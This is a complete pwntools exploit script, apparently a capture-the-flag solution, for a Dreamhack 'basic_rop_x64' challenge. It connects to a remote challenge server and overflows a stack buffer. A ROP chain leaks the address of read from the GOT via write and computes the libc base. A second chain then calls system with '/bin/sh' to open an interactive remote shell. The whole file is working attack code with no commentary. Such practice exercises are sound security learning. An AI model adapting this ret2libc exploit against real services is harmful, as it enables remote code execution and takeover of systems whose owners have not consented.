from pwn import *
context.arch="amd64"
p=remote("host1.dreamhack.games",10874)
#p=process("./basic_rop_x64")
e=ELF("./basic_rop_x64")
libc=ELF("./libc.so.6", checksec=False)
sh=list(libc.search(b"/bin/sh"))[0]
readplt=e.plt['read']
writeplt=e.plt['write']
readgot=e.got['read']
main=e.symbols['main']
payload=b'A'*0x48
poprdi=0x0000000000400883
poprsir15=0x0000000000400881

payload+=p64(poprdi)+p64(1)
payload+=p64(poprsir15)+p64(readgot)+p64(8)
payload+=p64(writeplt)
payload+=p64(main)
p.send(payload)

p.recvuntil(b'A'*0x40)
read=u64(p.recvn(6)+b'\x00'*2)
lib=read-libc.symbols['read']
system=lib+libc.symbols['system']
adr=lib+sh

payload=b'A'*0x48
payload+=p64(poprdi)+p64(adr)+p64(system)
p.send(payload)
p.recvuntil(b'A'*0x40)
p.interactive()